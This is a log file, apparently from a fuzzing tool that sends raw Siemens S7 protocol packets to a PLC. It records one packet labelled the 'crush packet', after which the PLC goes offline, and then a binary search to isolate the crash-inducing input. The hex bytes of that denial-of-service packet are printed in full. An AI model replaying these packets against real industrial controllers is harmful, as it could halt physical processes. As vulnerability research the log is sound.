[2021-11-22 18:59:49,945] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:49,952] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 18:59:49,954] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009000000800080001120411440100ff090004001c0000
[2021-11-22 18:59:50,162] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:50,305] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:50,307] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 18:59:50,308] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009100000800080001120411440100ff090004001c0000
[2021-11-22 18:59:50,517] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:50,528] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:50,531] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009200000800080001120411440100ff090004001c0000
[2021-11-22 18:59:50,531] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 18:59:50,738] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:50,753] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:50,755] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009300000800080001120411440100ff090004001c0000
[2021-11-22 18:59:50,755] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 18:59:50,956] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 18:59:50,963] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 18:59:50,965] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009400000800080001120411440100ff090004001c0000
[2021-11-22 18:59:51,179] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009500000800080001120411440100ff090004001c0000
[2021-11-22 18:59:51,387] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009600000800080001120411440100ff090004001c0000
[2021-11-22 18:59:51,592] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009700000800080001120411440100ff090004001c0000
[2021-11-22 18:59:51,797] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009800000800080001120411440100ff090004001c0000
[2021-11-22 18:59:52,001] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009900000800080001120411440100ff090004001c0000
[2021-11-22 18:59:52,208] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009a00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:52,412] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009b00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:52,618] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009c00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:52,823] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009d00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:53,028] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009e00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:53,232] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700009f00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:53,437] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a000000800080001120411440100ff090004001c0000
[2021-11-22 18:59:53,645] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a100000800080001120411440100ff090004001c0000
[2021-11-22 18:59:53,862] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a200000800080001120411440100ff090004001c0000
[2021-11-22 18:59:54,064] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a300000800080001120411440100ff090004001c0000
[2021-11-22 18:59:54,269] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a400000800080001120411440100ff090004001c0000
[2021-11-22 18:59:54,471] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a500000800080001120411440100ff090004001c0000
[2021-11-22 18:59:54,677] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a600000800080001120411440100ff090004001c0000
[2021-11-22 18:59:54,883] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a700000800080001120411440100ff090004001c0000
[2021-11-22 18:59:55,089] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a800000800080001120411440100ff090004001c0000
[2021-11-22 18:59:55,294] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000a900000800080001120411440100ff090004001c0000
[2021-11-22 18:59:55,502] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000aa00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:55,709] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ab00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:55,912] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ac00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:56,116] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ad00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:56,320] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ae00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:56,527] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000af00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:56,733] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b000000800080001120411440100ff090004001c0000
[2021-11-22 18:59:56,939] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b100000800080001120411440100ff090004001c0000
[2021-11-22 18:59:57,144] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b200000800080001120411440100ff090004001c0000
[2021-11-22 18:59:57,350] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b300000800080001120411440100ff090004001c0000
[2021-11-22 18:59:57,554] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b400000800080001120411440100ff090004001c0000
[2021-11-22 18:59:57,757] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b500000800080001120411440100ff090004001c0000
[2021-11-22 18:59:57,962] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b600000800080001120411440100ff090004001c0000
[2021-11-22 18:59:58,169] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b700000800080001120411440100ff090004001c0000
[2021-11-22 18:59:58,374] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b800000800080001120411440100ff090004001c0000
[2021-11-22 18:59:58,581] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000b900000800080001120411440100ff090004001c0000
[2021-11-22 18:59:58,784] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ba00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:58,990] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000bb00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:59,198] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000bc00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:59,402] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000bd00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:59,608] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000be00000800080001120411440100ff090004001c0000
[2021-11-22 18:59:59,811] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000bf00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:00,015] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c000000800080001120411440100ff090004001c0000
[2021-11-22 19:00:00,220] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c100000800080001120411440100ff090004001c0000
[2021-11-22 19:00:00,427] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c200000800080001120411440100ff090004001c0000
[2021-11-22 19:00:00,633] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c300000800080001120411440100ff090004001c0000
[2021-11-22 19:00:00,840] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c400000800080001120411440100ff090004001c0000
[2021-11-22 19:00:01,048] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c500000800080001120411440100ff090004001c0000
[2021-11-22 19:00:01,275] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c600000800080001120411440100ff090004001c0000
[2021-11-22 19:00:01,487] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c700000800080001120411440100ff090004001c0000
[2021-11-22 19:00:01,693] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c800000800080001120411440100ff090004001c0000
[2021-11-22 19:00:01,899] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000c900000800080001120411440100ff090004001c0000
[2021-11-22 19:00:02,106] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ca00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:02,323] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000cb00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:02,527] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000cc00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:02,730] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000cd00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:02,936] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ce00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:03,144] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000cf00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:03,351] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d000000800080001120411440100ff090004001c0000
[2021-11-22 19:00:03,554] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d100000800080001120411440100ff090004001c0000
[2021-11-22 19:00:03,759] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d200000800080001120411440100ff090004001c0000
[2021-11-22 19:00:03,975] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d300000800080001120411440100ff090004001c0000
[2021-11-22 19:00:04,182] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d400000800080001120411440100ff090004001c0000
[2021-11-22 19:00:04,385] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d500000800080001120411440100ff090004001c0000
[2021-11-22 19:00:04,589] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d600000800080001120411440100ff090004001c0000
[2021-11-22 19:00:04,791] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d700000800080001120411440100ff090004001c0000
[2021-11-22 19:00:05,007] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d800000800080001120411440100ff090004001c0000
[2021-11-22 19:00:05,210] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000d900000800080001120411440100ff090004001c0000
[2021-11-22 19:00:05,413] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000da00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:05,619] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000db00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:05,822] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000dc00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:06,028] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000dd00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:06,233] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000de00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:06,441] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000df00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:06,645] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e000000800080001120411440100ff090004001c0000
[2021-11-22 19:00:06,847] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e100000800080001120411440100ff090004001c0000
[2021-11-22 19:00:07,051] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e200000800080001120411440100ff090004001c0000
[2021-11-22 19:00:07,257] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e300000800080001120411440100ff090004001c0000
[2021-11-22 19:00:07,461] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e400000800080001120411440100ff090004001c0000
[2021-11-22 19:00:07,664] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e500000800080001120411440100ff090004001c0000
[2021-11-22 19:00:07,872] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e600000800080001120411440100ff090004001c0000
[2021-11-22 19:00:08,076] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e700000800080001120411440100ff090004001c0000
[2021-11-22 19:00:08,282] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e800000800080001120411440100ff090004001c0000
[2021-11-22 19:00:08,489] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000e900000800080001120411440100ff090004001c0000
[2021-11-22 19:00:08,693] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ea00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:08,900] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000eb00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:09,106] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ec00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:09,311] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ed00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:09,517] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ee00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:09,723] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ef00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:09,927] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f000000800080001120411440100ff090004001c0000
[2021-11-22 19:00:10,135] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f100000800080001120411440100ff090004001c0000
[2021-11-22 19:00:10,340] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f200000800080001120411440100ff090004001c0000
[2021-11-22 19:00:10,546] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f300000800080001120411440100ff090004001c0000
[2021-11-22 19:00:10,749] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f400000800080001120411440100ff090004001c0000
[2021-11-22 19:00:10,964] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f500000800080001120411440100ff090004001c0000
[2021-11-22 19:00:11,171] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f600000800080001120411440100ff090004001c0000
[2021-11-22 19:00:11,373] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f700000800080001120411440100ff090004001c0000
[2021-11-22 19:00:11,590] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f800000800080001120411440100ff090004001c0000
[2021-11-22 19:00:11,793] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000f900000800080001120411440100ff090004001c0000
[2021-11-22 19:00:11,998] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000fa00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:12,214] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000fb00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:12,432] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000fc00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:12,636] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000fd00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:12,841] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000fe00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:13,044] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f08032070000ff00000800080001120411440100ff090004001c0000
[2021-11-22 19:00:13,260] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000001000800080001120411440100ff090004001c0000
[2021-11-22 19:00:13,467] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000101000800080001120411440100ff090004001c0000
[2021-11-22 19:00:13,670] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000201000800080001120411440100ff090004001c0000
[2021-11-22 19:00:13,873] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000301000800080001120411440100ff090004001c0000
[2021-11-22 19:00:14,079] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000401000800080001120411440100ff090004001c0000
[2021-11-22 19:00:14,297] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000501000800080001120411440100ff090004001c0000
[2021-11-22 19:00:14,501] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000601000800080001120411440100ff090004001c0000
[2021-11-22 19:00:14,705] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000701000800080001120411440100ff090004001c0000
[2021-11-22 19:00:14,908] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000801000800080001120411440100ff090004001c0000
[2021-11-22 19:00:15,113] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000901000800080001120411440100ff090004001c0000
[2021-11-22 19:00:15,319] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000a01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:15,522] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000b01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:15,727] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000c01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:15,932] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000d01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:16,140] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000e01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:16,343] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000f01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:16,545] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001001000800080001120411440100ff090004001c0000
[2021-11-22 19:00:16,750] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001101000800080001120411440100ff090004001c0000
[2021-11-22 19:00:16,955] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001201000800080001120411440100ff090004001c0000
[2021-11-22 19:00:17,161] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001301000800080001120411440100ff090004001c0000
[2021-11-22 19:00:17,364] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001401000800080001120411440100ff090004001c0000
[2021-11-22 19:00:17,569] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001501000800080001120411440100ff090004001c0000
[2021-11-22 19:00:17,771] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001601000800080001120411440100ff090004001c0000
[2021-11-22 19:00:17,978] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001701000800080001120411440100ff090004001c0000
[2021-11-22 19:00:18,183] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001801000800080001120411440100ff090004001c0000
[2021-11-22 19:00:18,388] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001901000800080001120411440100ff090004001c0000
[2021-11-22 19:00:18,590] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001a01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:18,794] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001b01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:19,001] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001c01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:19,208] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001d01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:19,415] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001e01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:19,621] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700001f01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:19,827] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002001000800080001120411440100ff090004001c0000
[2021-11-22 19:00:20,032] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002101000800080001120411440100ff090004001c0000
[2021-11-22 19:00:20,235] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002201000800080001120411440100ff090004001c0000
[2021-11-22 19:00:20,439] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002301000800080001120411440100ff090004001c0000
[2021-11-22 19:00:20,646] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002401000800080001120411440100ff090004001c0000
[2021-11-22 19:00:20,853] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002501000800080001120411440100ff090004001c0000
[2021-11-22 19:00:21,057] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002601000800080001120411440100ff090004001c0000
[2021-11-22 19:00:21,260] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002701000800080001120411440100ff090004001c0000
[2021-11-22 19:00:21,466] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002801000800080001120411440100ff090004001c0000
[2021-11-22 19:00:21,673] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002901000800080001120411440100ff090004001c0000
[2021-11-22 19:00:21,891] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002a01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:22,093] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002b01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:22,310] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002c01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:22,515] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002d01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:22,721] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002e01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:23,270] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-22 19:00:23,271] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100002f01000e00000401120a10010003000083000001
[2021-11-22 19:00:23,478] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003001000800080001120411440100ff090004001c0000
[2021-11-22 19:00:23,681] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003101000800080001120411440100ff090004001c0000
[2021-11-22 19:00:23,885] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003201000800080001120411440100ff090004001c0000
[2021-11-22 19:00:24,092] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003301000800080001120411440100ff090004001c0000
[2021-11-22 19:00:24,309] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003401000800080001120411440100ff090004001c0000
[2021-11-22 19:00:24,513] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003501000800080001120411440100ff090004001c0000
[2021-11-22 19:00:24,719] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003601000800080001120411440100ff090004001c0000
[2021-11-22 19:00:24,925] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003701000800080001120411440100ff090004001c0000
[2021-11-22 19:00:25,130] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003801000800080001120411440100ff090004001c0000
[2021-11-22 19:00:25,348] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003901000800080001120411440100ff090004001c0000
[2021-11-22 19:00:25,553] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003a01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:25,760] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003b01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:25,966] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003c01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:26,171] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003d01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:26,375] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003e01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:26,580] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003f01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:26,788] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004001000800080001120411440100ff090004001c0000
[2021-11-22 19:00:26,803] [INFO] [MyS7Client.findArpPacket] -> passive detected a probable crush e0dca0439b86e0e1a91549c508060001080006040001e0e1a91549c5c0a80189e0dca0439b86c0a801bc
[2021-11-22 19:00:26,990] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:00:29,015] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-22 19:00:29,017] [INFO] [valition.handleCrush] -> handling crush
[2021-11-22 19:00:29,018] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-22 19:00:29,523] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-22 19:00:31,525] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-22 19:00:36,976] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-22 19:00:36,976] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-22 19:00:40,994] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-22 19:00:40,994] [INFO] [BLocate.locate] -> ****************Start binary search crush*************
[2021-11-22 19:00:40,995] [INFO] [BLocate.locate] -> chosenPacket from 0 to 20 ; leftPackets from 20 to 40.
[2021-11-22 19:00:40,995] [INFO] [MyS7Client.connect] -> Close old socket!
[2021-11-22 19:00:40,996] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-22 19:00:41,215] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000410100080000f000000a000a00f0
[2021-11-22 19:00:41,216] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300004101000800000000f0000003000300f0
[2021-11-22 19:00:41,218] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004201000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,220] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004301000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,223] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004401000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,225] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004501000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,226] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004601000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,228] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004701000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,230] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004801000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,231] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004901000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,233] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004a01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,235] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004b01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,236] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004c01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,239] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004d01000800080001120411440100ff090004001c0000
[2021-11-22 19:00:41,241] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004e01000800080001120411440100ff090004001c0000
